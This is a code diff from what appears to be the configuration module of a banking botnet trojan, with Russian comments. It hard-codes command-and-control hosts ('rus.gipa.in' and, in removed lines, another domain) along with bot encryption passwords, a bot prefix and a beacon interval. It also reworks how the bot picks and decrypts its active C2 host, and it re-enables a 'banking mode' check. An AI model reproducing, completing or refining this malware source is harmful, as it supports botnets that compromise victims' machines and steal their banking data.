@@ -44,8 +44,6 @@ namespace CONFIGDEBUGSTRINGS
 	//****************************************************************************
 	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = BOTPARAM_MAINHOSTS;
 
-	#define HASH_EMPTY_HOSTS_BUF  0xE98F4C1C /* ALL_HOSTS_BUFFER */
-
 
 	//----------------------------------------------------------------------------
 	// Интервал отстука (в минутах). Строковое значение
@@ -72,7 +70,20 @@ namespace CONFIGDEBUGSTRINGS
 
 
 //=============================================================================
+#else
+
+	//  Хосты должны быть с двумя нулями в конце
+	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE]	  = "rus.gipa.in\0";
+
+	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
+	char DebugBotPrefix[] = "aaaaaaaaa";
+	PCHAR DebugDelay      = "1";
+
+
 #endif
+
+
+#define HASH_EMPTY_HOSTS_BUF  0xE98F4C1C /* ALL_HOSTS_BUFFER */
 
 
 //----------------------------------------------------------------------------
@@ -112,28 +123,15 @@ const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z"}
 const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar"};
 
 
-#ifdef DEBUGCONFIG
 
-
-
-	char DebugHost[]	  = "rus.gipa.in";
-	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
-	char DebugBotPrefix[] = "aaaaaaaaa";
-	PCHAR DebugDelay      = "1";
-
-
-
-/*
-	char DebugHost[255]	  = "b8woftwiygef.org";
-	PCHAR DebugPassword   = "7Xr62vk4Cgx3Apns";
-	char DebugBotPrefix[] = "afttst"; //"bttest";
-	PCHAR DebugDelay      = "1";
-	*/
-
-
-
-#endif
-
+//------------------------------------------------------------------
+//  GetBotHosts - Функция возвращает указатель на массив хостов бота
+//------------------------------------------------------------------
+PCHAR GetBotHosts()
+{
+	return BOT_HOSTS_ARRAY;
+}
+//----------------------------------------------------------------------------
 
 
 string GetBankingModeFileName()
@@ -165,9 +163,6 @@ bool IsBankingMode()
 {
 	// Функция возвращает истину если включен режим "Банк"
 	// В этом режиме настройки бота могут отличаться от обычных
-
-
-	return false;
 
 	string FileName = GetBankingModeFileName();
 	return !FileName.IsEmpty() && FileExistsA(FileName.t_str());
@@ -308,8 +303,8 @@ int GetDelay()
 	void SetDebugHost(PCHAR Host)
 	{
 		
-		if (!StrCopy(DebugHost, Host))
-        	StrCopy(DebugHost, "localhost");
+		if (!StrCopy(BOT_HOSTS_ARRAY, Host))
+        	StrCopy(BOT_HOSTS_ARRAY, "localhost");
 	}
 #endif
 
@@ -318,47 +313,29 @@ int GetDelay()
 PCHAR GetActiveHost()
 {
 	// Функция возвращает активный (доступный) хост
-	#ifdef DEBUGCONFIG
-		return STR::New(DebugHost);
 
-	#else
+	CFGDBG("Cofig", "Получаем активный хост.");
+
+	#ifndef DEBUGCONFIG
 		PCHAR Result  = NULL;
 
-    	CFGDBG("Cofig", "Получаем активный хост.");
-
-    	// Первым этапом пытаемся получить хост из файла
+		// Первым этапом пытаемся получить хост из файла
 		if (Hosts::GetActiveHostFormFile(NULL, Result))
 		{
 			CFGDBG("Cofig", "Полусили хост из файла");
 			return Result;
 		}
-		return GetActiveHostFromBuf(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF);
 	#endif
+
+	return GetActiveHostFromBuf(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF);
+
 }
 //-----------------------------------------------------------------------------
 
 string GetActiveHost2()
 {
 	// Функция возвращает активный (доступный) хост
-	#ifdef DEBUGCONFIG
-		return DebugHost;
-
-	#else
-		string Result;
-
-		CFGDBG("Cofig", "Получаем активный хост");
-
-		// Первым этапом пытаемся получить хост из файла
-//		PCHAR Tmp = NULL;
-//		if (Hosts::GetActiveHostFormFile(NULL, Tmp))
-//		{
-//			CFGDBG("Cofig", "Полусили хост из файла");
-//			Result = Tmp;
-//			STR::Free(Tmp);
-//			return Result;
-//		}
-		return GetActiveHostFromBuf2(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF, true);
-	#endif
+	return GetActiveHostFromBuf2(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF, BOTPARAM_ENCRYPTED_HOSTS);
 }
 //-----------------------------------------------------------------------------
 
@@ -380,8 +357,10 @@ PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
 	while (*Host != 0 && (Host - Hosts) < MAX_HOSTS_BUF_SIZE)
 	{
 		// декриптуем хост и проверяем его
-		PCHAR Result = STR::Alloc(StrCalcLength(Host));
-		Decrypt(Host, Result);
+		PCHAR Result = STR::New(Host);
+
+		if (BOTPARAM_ENCRYPTED_HOSTS)
+			Decrypt(Host, Result);
 
 		if (Hosts::CheckHost(Result))
 			return Result;
@@ -541,7 +520,7 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 	#ifdef DEBUGCONFIG
 		switch (ParamID) {
 			case BOT_PARAM_PREFIX: Value = DebugBotPrefix;  break;
-			case BOT_PARAM_HOSTS:  Value = DebugHost; break;
+			case BOT_PARAM_HOSTS:  Value = BOT_HOSTS_ARRAY; break;
 			case BOT_PARAM_KEY:    Value = DebugPassword; break;
 			case BOT_PARAM_DELAY:  Value = DebugDelay; break;
 		default: return 0;;
